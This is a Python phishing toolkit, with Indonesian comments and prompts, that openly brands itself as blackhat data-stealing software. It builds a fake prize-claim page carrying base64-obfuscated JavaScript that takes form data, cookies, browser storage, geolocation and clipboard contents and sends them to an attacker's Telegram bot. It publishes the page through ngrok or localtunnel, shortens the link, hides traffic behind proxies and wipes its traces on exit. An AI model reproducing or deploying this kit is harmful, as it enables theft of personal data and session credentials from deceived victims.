import os
import subprocess
import time
import shutil
import threading
import random
import sys
import requests
from datetime import datetime
import socks
import socket
from faker import Faker
from base64 import b64encode
import logging
import json
import hashlib

# Setup logging
logging.basicConfig(filename='phishing_log.txt', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

fake = Faker()

# Proxy pool (ganti dengan list proxy lu sendiri)
proxy_list = [
    {"host": "1.2.3.4", "port": 8080, "type": "http"},
    {"host": "5.6.7.8", "port": 3128, "type": "http"},
]

# Animasi UI Hollywood-style
def hacker_ui():
    hacker_chars = ["0", "1", "#", "@", "$", "%", "&", "*", "!", "?"]
    hack_logs = [
        "🔎 Scanning target network...",
        "🛡️ Bypassing firewall...",
        "🌐 Connecting to dark pool...",
        "💉 Injecting payload...",
        "🎯 Awaiting victim interaction...",
        "📡 Transmitting stolen data to C2..."
    ]
    def animate():
        while True:
            sys.stdout.write("\033[H\033[J")
            print("\033[32m" + "🔥 BLACKHAT PHISHING CONSOLE V4 🔥".center(100) + "\033[0m")
            print("\033[31m" + "═"*100 + "\033[0m")
            for _ in range(8):
                print("".join(random.choice(hacker_chars) for _ in range(100)))
            print("\033[31m" + "═"*100 + "\033[0m")
            print("\033[33m" + f"Status: {random.choice(hack_logs)}".center(100))
            print("\033[33m" + "Data dikirim ke Telegram C2!".center(100))
            print("\033[31m" + "═"*100 + "\033[0m")
            time.sleep(0.3)
    threading.Thread(target=animate, daemon=True).start()

# Banner
def print_banner():
    banner = r"""
😈😈😈 PENCURI DATA ULTRA JAHAT V4 😈😈😈
__________  _________________________            
___  __ \ \/ /__  ____/___  _/_  ___/
__  /_/ /_  _/_____ \ __  / _____ \ 
_  ____/_  /  ____/ /___/ / ____/ / 
/_/     /_/   /____/ /____/ /____/  
                                    
    Coded by: Mr.4Rex_503 & Kevin4Chan1337
    Target: Android, iOS, Windows, Linux
    Powered by: Blackhat Indo Cyber Elite
😈 Optimized for Termux & BlackArch 😈
"""
    print(banner)

# Check dependensi
def check_dependencies():
    required = ['requests', 'faker', 'pysocks']
    for lib in required:
        try:
            __import__(lib)
        except ImportError:
            print(f"\033[31m{lib} not found, installing...\033[0m")
            os.system(f"pip install {lib}")

# Setup proxy
def setup_proxy(use_proxy):
    if use_proxy and proxy_list:
        proxy = random.choice(proxy_list)
        socks.set_default_proxy(socks.HTTP, proxy["host"], proxy["port"])
        socket.socket = socks.socksocket
        logging.info(f"Using proxy: {proxy['host']}:{proxy['port']}")
        return proxy
    return None

# Input Konfigurasi
def get_config():
    print("🔥 Masukkan konfigurasi, tuanku:")
    ngrok_authtoken = input("Masukkan Ngrok Authtoken: ")
    bot_token = input("Masukkan Telegram Bot Token: ")
    chat_id = input("Masukkan Telegram Chat ID: ")
    tinyurl_api = input("Masukkan TinyURL API Token (kosongkan jika tidak ada): ")
    use_proxy = input("Pake proxy? (y/n): ").lower() == 'y'
    return ngrok_authtoken, bot_token, chat_id, tinyurl_api, use_proxy

# Menu Pilihan
def show_menu():
    print("\n🎯 Pilih Target:")
    print("1. Android")
    print("2. iOS")
    print("3. Windows")
    print("4. Linux")
    print("5. Multi-Target (All)")
    print("6. Keluar")
    return input("Pilih [1-6]: ")

# Obfuscasi JS
def obfuscate_js(js_code):
    return f"eval(atob('{b64encode(js_code.encode()).decode()}'))"

# Template HTML Phishing
def generate_html(target, bot_token, chat_id):
    target_name = {'1': 'Android', '2': 'iOS', '3': 'Windows', '4': 'Linux', '5': 'All'}.get(target, 'All')
    js_code = f"""
async function stealData() {{
    try {{
        document.getElementById('loader').style.display = 'block';
        const name = document.getElementById('name').value;
        const email = document.getElementById('email').value;
        const phone = document.getElementById('phone').value;
        const cookies = document.cookie;
        const localStorageData = JSON.stringify(localStorage);
        const sessionStorageData = JSON.stringify(sessionStorage);
        const deviceInfo = {{
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${{window.screen.width}}x${{window.screen.height}}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            battery: await navigator.getBattery?.().then(b => ({{level: b.level, charging: b.charging}})) || 'Tidak tersedia',
            geolocation: await new Promise(resolve => {{
                let attempts = 0;
                function tryGeo() {{
                    if (attempts++ < 3) {{
                        navigator.geolocation.getCurrentPosition(
                            pos => resolve({{lat: pos.coords.latitude, lon: pos.coords.longitude}}),
                            () => setTimeout(tryGeo, 1000)
                        );
                    }} else {{
                        resolve('Geolokasi ditolak');
                    }}
                }}
                tryGeo();
            }})
        }};
        const clipboardData = await navigator.clipboard?.readText().catch(() => 'Clipboard tidak tersedia');
        const telegramUrl = `https://api.telegram.org/bot{bot_token}/sendMessage`;
        await fetch(telegramUrl, {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify({{
                chat_id: '{chat_id}',
                text: `Target: {target_name}\\nData Curian:\\n${{JSON.stringify({{name, email, phone, cookies, localStorageData, sessionStorageData, deviceInfo, clipboardData}}, null, 2)}}`
            }})
        }});
        document.getElementById('loader').style.display = 'none';
        alert('Selamat! Hadiah Anda sedang diproses. Cek email Anda!');
        window.location.href = 'https://google.com';
    }} catch (error) {{
        document.getElementById('loader').style.display = 'none';
        console.error('Gagal mencuri:', error);
        alert('Ups, terjadi kesalahan. Coba lagi nanti!');
    }}
}}
window.onload = () => {{
    if (!document.getElementById('name').value) {{
        stealData();
    }}
}};
"""
    html_content = f"""<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{'Promo Eksklusif' if target == '5' else f"Klaim Hadiah {target_name}"} | Secure Login</title>
    <style>
        body {{
            background: linear-gradient(135deg, #1e3c72, #2a5298, #ff4b4b);
            font-family: 'Roboto', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #fff;
            overflow: hidden;
        }}
        .container {{
            background: rgba(0, 0, 0, 0.95);
            padding: 50px;
            border-radius: 30px;
            box-shadow: 0 0 50px rgba(255, 75, 75, 0.8);
            text-align: center;
            animation: fadeIn 1s ease-in-out;
            width: 90%;
            max-width: 500px;
        }}
        h1 {{
            font-size: 2.5em;
            margin-bottom: 20px;
            text-shadow: 0 0 20px #ff4b4b;
            animation: glitch 2s infinite;
        }}
        p {{
            font-size: 1.2em;
            margin-bottom: 30px;
        }}
        input {{
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: none;
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.1);
            color: #fff;
            font-size: 1em;
        }}
        .btn {{
            padding: 15px 40px;
            font-size: 1.2em;
            background: linear-gradient(45deg, #ff4b4b, #ff8e53);
            border: none;
            border-radius: 50px;
            color: #fff;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
        }}
        .btn:hover {{
            transform: scale(1.1);
            box-shadow: 0 0 20px #ff4b4b;
        }}
        .loader {{
            display: none;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #ff4b4b;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        @keyframes fadeIn {{
            from {{ opacity: 0; transform: scale(0.8); }}
            to {{ opacity: 1; transform: scale(1); }}
        }}
        @keyframes glitch {{
            0% {{ transform: translate(0); }}
            20% {{ transform: translate(-2px, 2px); }}
            40% {{ transform: translate(-2px, -2px); }}
            60% {{ transform: translate(2px, 2px); }}
            80% {{ transform: translate(2px, -2px); }}
            100% {{ transform: translate(0); }}
        }}
        .particles {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
        }}
        .particle {{
            position: absolute;
            background: rgba(255, 255, 255, 0.7);
            border-radius: 50%;
            animation: float 10s infinite;
        }}
        @keyframes float {{
            0% {{ transform: translateY(0); opacity: 0.8; }}
            50% {{ opacity: 0.4; }}
            100% {{ transform: translateY(-100vh); opacity: 0; }}
        }}
    </style>
</head>
<body>
    <div class="particles" id="particles"></div>
    <div class="container">
        <h1>{'Klaim Hadiah Sekarang!' if target == '5' else f"Klaim Hadiah {target_name}"}</h1>
        <p>{'Masukkan data untuk klaim hadiah eksklusif!' if target == '5' else f"Isi data untuk kesempatan menang {target_name}!"}</p>
        <input type="text" id="name" placeholder="Nama Lengkap" required>
        <input type="email" id="email" placeholder="Email" required>
        <input type="tel" id="phone" placeholder="Nomor Telepon" required>
        <input type="text" id="captcha" placeholder="Masukkan CAPTCHA (jika ada)" style="display:none">
        <button class="btn" onclick="stealData()">Klaim Sekarang</button>
        <div class="loader" id="loader"></div>
    </div>
    <script>
        function createParticles() {{
            const particlesContainer = document.getElementById('particles');
            for (let i = 0; i < 150; i++) {{
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.width = `${{Math.random() * 8 + 4}}px`;
                particle.style.height = particle.style.width;
                particle.style.left = `${{Math.random() * 100}}%`;
                particle.style.animationDelay = `${{Math.random() * 10}}s`;
                particlesContainer.appendChild(particle);
            }}
        }}
        createParticles();
        {obfuscate_js(js_code)}
    </script>
</body>
</html>"""
    return html_content

# Fungsi untuk mempersingkat URL dengan TinyURL
def shorten_url(url, tinyurl_api, use_proxy):
    if not tinyurl_api:
        return url
    proxy = setup_proxy(use_proxy)
    try:
        response = requests.get(
            f"https://api.tinyurl.com/create?api_token={tinyurl_api}",
            params={"url": url},
            proxies={"http": f"http://{proxy['host']}:{proxy['port']}" if proxy else None}
        ).json()
        return response.get('data', {}).get('tiny_url', url)
    except Exception as e:
        logging.error(f"TinyURL error: {e}")
        return url

# Fallback ke localtunnel jika Ngrok gagal
def setup_localtunnel(port):
    localtunnel_executable = "lt" if not sys.platform.startswith("win") else "lt.exe"
    if not shutil.which(localtunnel_executable):
        print("❌ Localtunnel tidak ditemukan. Install dengan: npm install -g localtunnel")
        return None
    try:
        lt_process = subprocess.Popen([localtunnel_executable, "--port", str(port)], stdout=subprocess.PIPE)
        time.sleep(3)
        lt_url = subprocess.check_output(["curl", "-s", "http://localhost:4040/api/tunnels"]).decode()
        lt_url = lt_url.split('"public_url":"')[1].split('"')[0]
        return lt_url, lt_process
    except:
        return None, None

# Buat File dan Jalankan Server
def setup_phishing(target, ngrok_authtoken, bot_token, chat_id, tinyurl_api, use_proxy):
    folder_name = f"phishing_site_{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
    os.makedirs(folder_name, exist_ok=True)
    
    html_content = generate_html(target, bot_token, chat_id)
    with open(f"{folder_name}/index.html", "w", encoding="utf-8") as f:
        f.write(html_content)
    
    server_process = subprocess.Popen(["python", "-m", "http.server", "8080"], cwd=folder_name)
    
    ngrok_executable = "ngrok" if not sys.platform.startswith("win") else "ngrok.exe"
    ngrok_url = None
    if shutil.which(ngrok_executable):
        ngrok_config = f"""authtoken: {ngrok_authtoken}
tunnels:
  phishing:
    addr: 8080
    proto: http
"""
        with open("ngrok.yml", "w", encoding="utf-8") as f:
            f.write(ngrok_config)
        
        try:
            ngrok_process = subprocess.Popen([ngrok_executable, "start", "--config", "ngrok.yml", "phishing"])
            for _ in range(5):
                try:
                    time.sleep(3)
                    ngrok_url = subprocess.check_output(["curl", "-s", "http://localhost:4040/api/tunnels"]).decode()
                    ngrok_url = ngrok_url.split('"public_url":"')[1].split('"')[0]
                    break
                except:
                    print("🔄 Mencoba mendapatkan URL Ngrok...")
        except:
            ngrok_process = None
    else:
        print("❌ Ngrok tidak ditemukan, mencoba localtunnel...")
        ngrok_process = None
    
    if not ngrok_url:
        ngrok_url, ngrok_process = setup_localtunnel(8080)
    
    if ngrok_url:
        short_url = shorten_url(ngrok_url, tinyurl_api, use_proxy)
        print(f"\n🎉 Link Phishing Siap Disebar: {short_url}")
        print("🔗 Kirim link ini via WhatsApp/Telegram!")
        print("⏳ Menunggu target mengklik... Data akan masuk ke bot Telegram!")
        logging.info(f"Phishing URL: {short_url}")
    else:
        print("❌ Gagal mendapatkan URL. Cek Ngrok/localtunnel dan authtoken!")
        server_process.terminate()
        if ngrok_process:
            ngrok_process.terminate()
        sys.exit(1)
    
    def monitor_processes():
        while server_process.poll() is None and (ngrok_process and ngrok_process.poll() is None):
            time.sleep(1)
        if server_process.poll() is not None:
            print("❌ Server lokal mati! Menghentikan operasi...")
            if ngrok_process:
                ngrok_process.terminate()
        if ngrok_process and ngrok_process.poll() is not None:
            print("❌ Ngrok/localtunnel mati! Menghentikan operasi...")
            server_process.terminate()
    
    threading.Thread(target=monitor_processes, daemon=True).start()
    return server_process, ngrok_process, folder_name

# Main Program
def main():
    check_dependencies()
    print_banner()
    ngrok_authtoken, bot_token, chat_id, tinyurl_api, use_proxy = get_config()
    
    while True:
        choice = show_menu()
        if choice in ["1", "2", "3", "4", "5"]:
            print(f"\n🔨 Membuat halaman phishing untuk {'Multi-Target' if choice == '5' else {'1': 'Android', '2': 'iOS', '3': 'Windows', '4': 'Linux'}[choice]}...")
            server_process, ngrok_process, folder_name = setup_phishing(choice, ngrok_authtoken, bot_token, chat_id, tinyurl_api, use_proxy)
            hacker_ui()
            try:
                input("\n😈 Tekan Enter untuk menghentikan server dan keluar...")
            finally:
                server_process.terminate()
                if ngrok_process:
                    ngrok_process.terminate()
                shutil.rmtree(folder_name, ignore_errors=True)
                if os.path.exists("ngrok.yml"):
                    os.remove("ngrok.yml")
                print("🧹 Membersihkan jejak... Selesai!")
            break
        elif choice == "6":
            print("😈 Keluar dari mode jahat. Sampai jumpa, tuanku!")
            break
        else:
            print("❌ Pilihan salah! Pilih 1-6.")

if __name__ == "__main__":
    main()
